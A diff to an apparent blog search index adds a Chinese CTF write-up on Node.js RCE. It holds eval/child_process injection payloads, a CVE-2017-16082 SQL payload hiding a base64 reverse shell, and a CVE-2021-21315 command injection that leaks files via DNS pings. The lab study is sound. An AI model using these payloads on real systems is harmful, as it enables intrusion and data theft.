@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>Node.js RCE 漏洞总结</title>
+      <link href="/posts/2767279470/"/>
+      <url>/posts/2767279470/</url>
+      
+        <content type="html"><![CDATA[<h2 id="命令执行">命令执行</h2><p>使用 <a href="https://nodejs.cn/api/child_process.html#child_processspawnsynccommand-args-options">child_process 子进程</a> 执行系统指令</p><p>如果有使用 eval 函数则可以使用以下方式执行系统指令</p><pre><code>?eval=require('child_process').execSync('cmd').toString()</code></pre><p>以上指令详细解释：</p><ul><li><code>require('child_process')</code> 用于导入 Node.js 的 child_process 模块。<ul><li>注：Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令</li></ul></li><li><code>execSync('cmd')</code> 同步执行其中的指令</li><li><code>toString()</code> 将返回的对象转换为字符串类型</li></ul><p>若过滤了exec，还有 <code>spawnSync</code> 用法和详细解释如下</p><pre><code>eval=require(&quot;child_process&quot;).spawnSync('cmd',['args']).stdout.toString()</code></pre><ul><li><code>require('child_process')</code> 同上</li><li><code>spawnSync('cmd',['args'])</code> 同步执行 cmd 命令，数组内容是参数</li><li><code>stdout</code> 访问子进程的标准输出，它是一个缓冲区（Buffer）对象。</li><li><code>toString()</code> 方法将缓冲区转换为字符串，使输出内容可读。</li></ul><h3 id="例题">例题</h3><ul><li>CTFshow - web335</li><li>CTFshow - web336</li></ul><h2 id="Node-js-CVE-的复现">Node.js CVE 的复现</h2><h3 id="CVE-2017-16082">CVE-2017-16082</h3><h4 id="原理">原理</h4><p>详细请见<a href="https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html"> node.js + postgres 从注入到Getshell</a></p><p>简述：获取数据库字段名并处理时将字段名作为参数传入 Function 类中，搭配 SQL 注入即可通过其创建的函数来远程执行代码</p><h4 id="复现">复现</h4><p>靶机地址：<br /><a href="https://github.com/vulhub/vulhub/blob/master/node/CVE-2017-16082/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/node/CVE-2017-16082/README.zh-cn.md</a></p><p>Payload：</p><pre><code class="language-sql">SELECT 1 AS &quot;\']=0;require=process.mainModule.constructor._load;/*&quot;, 2 AS &quot;*/p=require(`child_process`);/*&quot;, 3 AS &quot;*/p.exec(`echo YmFzaCAtaSA+JiAvZGV2L3Rj`+/*&quot;, 4 AS &quot;*/`cC8xNzIuMTkuMC4xLzIxIDA+JjE=|base64 -d|bash`)//&quot;</code></pre><p>靶机中无法直接控制字段名，但是因为可以多句执行，所以也可以控制传入的字段名</p><p><img data-fancybox="gallery" src="https://img.24kblog.top/app/hide.php?key=MEpGdExCZWlSemtNOXlQYzRCQUNFUFZjZCtGOHBheFE=" alt="Pasted image 20250331231432" data-caption="Pasted image 20250331231432" loading="lazy"></p><p>虽然此处返回内部错误，但此处其实已经成功反弹了 shell</p><p><img data-fancybox="gallery" src="https://img.24kblog.top/app/hide.php?key=M1JhdkJCT05HUFM0UllPNEJNSG0zL1ZjZCtGOHBheFE=" alt="Pasted image 20250331231548" data-caption="Pasted image 20250331231548" loading="lazy"></p><p>注意事项：在传参的过程中要进行 URL 编码后再发送请求，否则无法复现成功</p><h3 id="CVE-2021-21315">CVE-2021-21315</h3><p>靶机地址：使用 <a href="https://github.com/fofapro/vulfocus">vulfocus</a> 自建</p><p>Payload</p><pre><code>http://ip:port/api/getServices?name[]=$(&quot;cmd&quot;)</code></pre><p>仅需发送 GET 请求即可</p><p>在靶机中使用的 Payload 如下：</p><pre><code>http://127.0.0.1:56430/api/getServices?name[]=$(ping%20`ls%20/tmp`.d247976159.ipv6.bypass.eu.org)</code></pre><p>使用 Dnslog 服务，最终得到 flag</p><p><img data-fancybox="gallery" src="https://img.24kblog.top/app/hide.php?key=cy9IVUJkbmplQ0ZBVTR5dFJsR2plUFZjZCtGOHBheFE=" alt="1743440284690" data-caption="1743440284690" loading="lazy"></p><p><img data-fancybox="gallery" src="https://img.24kblog.top/app/hide.php?key=WVk5WEZ2L1p5ZzVSb25Gd2hCM3lwZlZjZCtGOHBheFE=" alt="Pasted image 20250401010532" data-caption="Pasted image 20250401010532" loading="lazy"></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> 笔记 </tag>
+            
+            <tag> Node.js </tag>
+            
+            <tag> RCE </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Python逆向</title>
       <link href="/posts/426072920/"/>
       <url>/posts/426072920/</url>
